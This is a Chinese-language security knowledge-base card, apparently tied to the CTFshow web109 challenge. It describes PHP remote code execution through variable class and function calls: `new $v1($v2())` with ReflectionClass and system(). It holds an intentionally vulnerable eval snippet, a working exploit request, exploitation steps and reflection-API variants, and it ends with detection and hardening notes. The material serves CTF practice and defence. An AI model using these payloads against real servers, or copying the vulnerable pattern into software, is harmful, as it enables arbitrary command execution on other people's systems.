---
id: web-php-rce-variable-class-function-call-reflection
title: PHP 可变类与函数调用：echo new $v1($v2()) 模式执行任意函数
type: scenario
domain: web
path: web/php/rce
technique: php-variable-class-function-call-rce
tags:
- php
- rce
- reflection
- variable-function
- eval
- code-injection
cve: []
severity: critical
confidence: medium
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V16
  verified_at: '2026-11-05T01:57:37+08:00'
  notes: 已对照原文核对（原文无图片）：CTFshow web109 eval("echo new $v1($v2());") 中 v1=ReflectionClass、v2=system('tac fl36dg.txt')，命令在参数求值阶段先执行，随后对返回值再次调用可能报错。卡内对该语义、ReflectionClass::__toString 触发点及拓展的 ReflectionMethod/ReflectionFunction 用法描述与原文一致，confidence medium 合适。PoC 未本机执行；frontmatter无sources/source_url。
url: /docs/web/php/rce/web-php-rce-variable-class-function-call-reflection/
draft: false
kb_aliases:
- new $v1($v2()) RCE
- 可变类名可变函数
- ReflectionClass __toString
- CTFshow web109
- 反射类任意方法调用
- ReflectionFunction invoke
---

## 一句话结论

当应用把用户输入拼进 `new $class($func())` 这类可变类/可变函数调用时，攻击者可以指定 `ReflectionClass` 等内置类并让 `$func()` 位置执行 `system('cmd')` 等任意函数；命令在对象构造参数求值阶段就已执行，`echo` 再通过内置类的 `__toString` 把结果带回响应。

## 原理

- PHP 支持可变类名与可变函数：`new $class(...)` 会实例化 `$class` 指定的类，`$func(...)` 会调用 `$func` 指定的函数；若这两个值来自用户输入且没有白名单，就等价于任意类实例化与任意函数调用。
- 典型脆弱写法是 `eval("echo new $v1($v2());")`：`$v1`、`$v2` 来自 GET。eval 展开后，`$v2` 的值被当作一段 PHP 表达式放在构造参数位置，例如 `v2=system('cmd')` 展开为 `system('cmd')()`。
- PHP 会先求值内层 `system('cmd')`，命令立即执行并把输出写入响应；随后对返回值再次调用函数可能报错，但命令已经执行，不影响结果。
- `echo` 一个对象会触发其 `__toString()`；`ReflectionClass`、`Exception`、`CachingIterator` 等内置类都实现了该魔术方法，可让表达式合法并回显参数/类信息。原文用 `v1=ReflectionClass`。
- 更一般的代码审计模式：用户可控的类名、方法名、参数进入 `ReflectionClass::getMethod()->invoke()`、`ReflectionMethod::invoke()` 或 `ReflectionFunction::invoke()`，可调用危险方法或绕过 `private` 限制（`setAccessible(true)`）。

## 触发条件

- 代码中存在用户可控的可变类/可变函数调用，或把用户输入传给反射 API 的类名/方法名/参数。
- 应用未对类名、函数名做白名单；`eval`/动态调用位置没有过滤。
- 目标 PHP 未禁用 `system`、`exec`、`passthru` 等函数（或存在可用的替代函数/类方法）。
- 需要回显时，所选类实现了 `__toString` 或命令本身直接输出。

## 利用步骤

1. 确认类名参数 `v1` 与函数表达式参数 `v2` 可控，观察报错判断是否进入 `eval`/动态调用。
2. 选一个可无参/带字符串构造的内置类（如 `ReflectionClass`）作为 `v1`，保证 `new` 合法且 `echo` 有输出。
3. 在 `v2` 位置构造函数调用字符串，例如 `system('id')`；eval 展开后在参数求值阶段执行。
4. 命令输出直接回显；若被再次调用报错，可改用会正常返回字符串的函数或先写文件/反弹 shell。
5. 若目标是反射 API 调用而非 eval，则按 `class`/`method`/参数逐个尝试，调用 `ReflectionFunction('system')->invoke('id')` 等。

## PoC

脆弱代码：

```php
<?php
if (isset($_GET['v1']) && isset($_GET['v2'])) {
    $v1 = $_GET['v1'];
    $v2 = $_GET['v2'];
    if (preg_match('/[a-zA-Z]+/', $v1) && preg_match('/[a-zA-Z]+/', $v2)) {
        eval("echo new $v1($v2());");
    }
}
```

利用：

```http
GET /?v1=ReflectionClass&v2=system('tac%20fl36dg.txt') HTTP/1.1
```

展开后近似为：

```php
echo new ReflectionClass(system('tac fl36dg.txt')());
```

`system()` 先执行并回显文件内容；也可把 `v2` 换成 `phpinfo`、`passthru('id')` 等。

反射 API 场景：

```php
$class  = $_GET['class'];   // 例如 ReflectionFunction
$method = $_GET['method'];  // 例如 invoke
$ref = new ReflectionClass($class);
$ref->getMethod($method)->invoke(null);   // 若参数也可控，可进一步调用 system
```

## 变体与关联

- 变体：`v1` 换成其他实现 `__toString` 的内置类（`Exception`、`CachingIterator`），或换用会触发其他魔术方法的类。
- 变体：通过 `ReflectionFunction('system')->invoke('cmd')` 直接调用函数；通过 `ReflectionMethod` 调用私有方法并配合 `setAccessible(true)` 突破访问控制。
- 变体：类名/方法名可控但参数不可控时，寻找目标类中无参且危险的方法（文件读写、命令执行、模板渲染）。
- 关联：[[web-php-deserialization-reflection-private-property-payload]]（反射在 payload 构造侧的另一种用法）。
- 边界：禁用危险函数、开启 `disable_functions` 且无可绕过函数、类名/函数名有严格白名单、或动态调用参数被强类型限制时，利用受限。

## 检测与防御

- 检测：请求参数中出现 `ReflectionClass`、`ReflectionFunction`、`system(`、`passthru(`、`exec(` 等；错误日志出现 `eval()'d code`、可变函数调用相关致命错误。
- 防御：禁止 `eval` 与用户可控的动态类/函数调用；类名、方法名、函数名必须白名单。
- 加固：`disable_functions` 禁用命令执行函数；对反射 API 的输入做类型与范围校验；关闭 `display_errors`，避免报错泄露结构。
